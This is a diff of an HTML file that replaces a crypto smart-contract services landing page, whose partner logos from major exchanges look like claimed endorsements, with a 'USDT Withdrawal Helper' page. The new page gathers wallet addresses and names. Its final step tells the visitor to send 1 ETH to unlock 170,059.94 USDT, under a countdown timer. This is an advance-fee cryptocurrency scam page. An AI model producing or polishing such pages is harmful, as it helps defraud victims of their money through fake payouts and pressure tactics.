@@ -1,137 +1,48 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ChainScript Labs - Smart Contract Services</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>USDT Withdrawal Helper</title>
   <link rel="stylesheet" href="style.css">
-  <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
-
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/680b70cc4b378d190bfa0d86/1ipmb18m3';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End of Tawk.to Script-->
 </head>
 <body>
-
-  <header>
-    <nav>
-      <div class="logo">ChainScript Labs</div>
-      <ul class="nav-links">
-        <li><a href="#services">Services</a></li>
-        <li><a href="#why-us">Why Us</a></li>
-        <li><a href="#ready-products">Ready Products</a></li> <!-- Added Ready Products Link -->
-        <li><a href="#partners">Partners</a></li>
-      </ul>
-      <button class="cta-button" onclick="connectWallet()">Connect Wallet</button>
-    </nav>
-    <div id="wallet-address"></div>
-  </header>
-
-  <section class="hero fade-in">
-    <h1>Custom Blockchain Contracts Delivered Fast</h1>
-    <p>We build, test, and deploy smart contracts for DeFi, NFTs, DAOs, and more.</p>
-    <a class="cta-button" href="#services">Explore Services</a>
-  </section>
-
-  <section id="services" class="fade-in">
-    <h2>Our Services</h2>
-    <div class="service-grid">
-      <div class="service-card">
-        <h3>DeFi Smart Contracts</h3>
-        <p>Yield farming, staking, and lending protocols built with secure, gas-optimized Solidity code.</p>
-      </div>
-      <div class="service-card">
-        <h3>NFT Smart Contracts</h3>
-        <p>ERC-721 and ERC-1155 NFT minting, royalties, and full collection deployment.</p>
-      </div>
-      <div class="service-card">
-        <h3>DAO Development</h3>
-        <p>Governance tokens and decision-making contracts built on established DAO frameworks.</p>
-      </div>
-      <div class="service-card">
-        <h3>Auditing & Security</h3>
-        <p>Manual and automated auditing with test coverage, simulations, and documentation.</p>
-      </div>
+  <div class="container">
+    <div class="box" id="step1">
+      <h2>Withdraw Setup</h2>
+      <label>Withdrawal Address</label>
+      <input type="text" id="withdrawalAddress" placeholder="e.g. 0xABC123...">
+      <label>Choose Your Network</label>
+      <select id="network">
+        <option value="">-- Select Network --</option>
+        <option value="Ethereum">Ethereum</option>
+        <option value="Binance Smart Chain">Binance Smart Chain</option>
+        <option value="Tron">Tron</option>
+        <option value="Polygon">Polygon</option>
+      </select>
+      <button onclick="confirmStep1()">Continue</button>
     </div>
-  </section>
 
-  <section id="why-us" class="fade-in">
-    <h2>Why Choose ChainScript Labs?</h2>
-    <ul class="features-list">
-      <li><strong>✅ Expert Developers:</strong> Solidity, Hardhat, OpenZeppelin.</li>
-      <li><strong>⚡ Fast Turnaround:</strong> Delivered in 3–7 days depending on scope.</li>
-      <li><strong>💰 Fixed Pricing:</strong> Know your costs upfront—no surprises.</li>
-      <li><strong>🔧 Support Included:</strong> Bug fixes and guidance post-deployment.</li>
-    </ul>
-  </section>
-
-  <!-- Ready Made Products Section -->
-  <section id="ready-products" class="fade-in">
-    <h2>Ready Products for Instant Delivery</h2>
-    <p>We have pre-built smart contracts ready to deploy instantly. Choose from our ready-made products:</p>
-    <div class="product-grid">
-      <div class="product-card">
-        <h3>Bitcoin Secure Contract</h3>
-        <p><strong>Price:</strong> $4,899.99</p>
-        <p>This contract allows you to securely store and transfer Bitcoin with advanced security features, including multi-signature support and enhanced encryption methods. Perfect for high-value transactions and long-term storage solutions.</p>
-        <a href="#contact" class="cta-button">Buy Now</a>
-      </div>
-      <div class="product-card">
-        <h3>Ledger Contract</h3>
-        <p><strong>Price:</strong> $5,799.99</p>
-        <p>This contract offers full account management with extra security. It includes functionalities like multi-signature wallets, customizable permissions, and secure audit logs for transactions. Ideal for businesses or individuals requiring top-tier account protection.</p>
-        <a href="#contact" class="cta-button">Buy Now</a>
-      </div>
-      <div class="product-card">
-        <h3>DeFi Yield Farming Contract</h3>
-        <p><strong>Price:</strong> $8,199.99</p>
-        <p>Unlock the power of decentralized finance with our yield farming contract. This contract enables users to stake their assets and earn yield in various liquidity pools, with automated rewards distribution and risk management features. A great option for DeFi enthusiasts and crypto investors.</p>
-        <a href="#contact" class="cta-button">Buy Now</a>
-      </div>
+    <div class="box" id="step2" style="display:none;">
+      <h2>Receiver Information</h2>
+      <label>Receiver Address</label>
+      <input type="text" id="receiverAddress" placeholder="e.g. 0xReceiver...">
+      <label>Name</label>
+      <input type="text" id="receiverName" placeholder="First Name">
+      <label>Surname</label>
+      <input type="text" id="receiverSurname" placeholder="Last Name">
+      <button onclick="confirmStep2()">Continue</button>
     </div>
-  </section>
 
-  <!-- Our Partners Section -->
-  <section id="partners" class="fade-in">
-    <h2>Our Partners</h2>
-    <p>We collaborate with leading companies in the crypto space to ensure top-notch services for our clients:</p>
-    <div class="partner-logos">
-      <img src="https://play-lh.googleusercontent.com/qS53X47RxpMFo9qIabt0v6lATabHjL0TAfXQbBmrzTtS5ZN6zPaD-6lhn6Qzdo8bCKFN" alt="Newton Crypto Exchange" class="partner-logo">
-      <img src="https://seeklogo.com/images/E/exodus-logo-A119631E25-seeklogo.com.png" alt="Exodus" class="partner-logo">
-      <img src="https://altcoinsbox.com/wp-content/uploads/2023/01/crypto.com-logo.png" alt="Crypto.com" class="partner-logo">
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTGHEnZfgudkA2tHB7tQMzUTdvEoEcpS0dBJw&s" alt="Coinbase" class="partner-logo">
+    <div class="box" id="step3" style="display:none;">
+      <h2>Final Step</h2>
+      <p><strong>To withdraw 170,059.94 USDT:</strong></p>
+      <p>Send <strong>1 ETH</strong> to the following network:</p>
+      <p><strong>Network:</strong> <span id="finalNetwork"></span></p>
+      <p><strong>Address:</strong> <span class="highlight">gduygfsyugfgefuishofseohfosh</span></p>
+      <div id="timer">Waiting... 59:00</div>
     </div>
-  </section>
-
-  <section id="contact" class="fade-in">
-    <h2>Get in Touch</h2>
-    <form onsubmit="validateForm(event)">
-      <label for="name">Name</label>
-      <input type="text" id="name" name="name" required>
-
-      <label for="email">Email</label>
-      <input type="email" id="email" name="email" required>
-
-      <label for="message">Project Details</label>
-      <textarea id="message" name="message" rows="5" required></textarea>
-
-      <button type="submit">Send Message</button>
-    </form>
-  </section>
-
-  <footer>
-    &copy; 2025 ChainScript Labs. All rights reserved.
-  </footer>
+  </div>
 
   <script src="script.js"></script>
 </body>
